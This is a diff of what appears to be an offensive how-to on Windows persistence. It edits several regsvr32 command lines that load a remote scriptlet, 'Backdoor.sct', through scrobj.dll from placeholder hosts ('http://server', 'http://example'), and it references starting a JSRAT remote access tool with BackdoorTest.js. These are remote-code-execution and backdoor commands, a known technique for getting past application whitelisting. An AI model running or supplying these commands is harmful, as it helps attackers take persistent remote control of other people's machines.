@@ -9,7 +9,7 @@ https://github.com/subTee/SCTPersistence
 His Way:
 
 
-1.On host, execute regsvr32.exe /s /i:http://server/Backdoor.sct scrobj.dll
+1.On host, execute regsvr32.exe /u /n /s /i:http://server/Backdoor.sct scrobj.dll
 
 
 -The default is to use the path to a local file
@@ -54,7 +54,7 @@ x.Exec();`
 My Way:
 
 
-1.On host, execute regsvr32.exe /s /i:http://server/Backdoor.sct scrobj.dll
+1.On host, execute regsvr32.exe /u /n /s /i:http://server/Backdoor.sct scrobj.dll
 
 
 -The default is to use the path to a local file
@@ -87,13 +87,13 @@ ref.Exec();`
 1.(local)
 
 
-`regsvr32.exe /s /i:Backdoor.sct scrobj.dll`
+`regsvr32.exe /u /n /s /i:Backdoor.sct scrobj.dll`
 
 
 or (remote)
 
 
-`regsvr32.exe /s /i:http://example/Backdoor.sct scrobj.dll`
+`regsvr32.exe /u /n /s /i:http://example/Backdoor.sct scrobj.dll`
 
 
 2.run BackdoorTest.js to start JSRAT
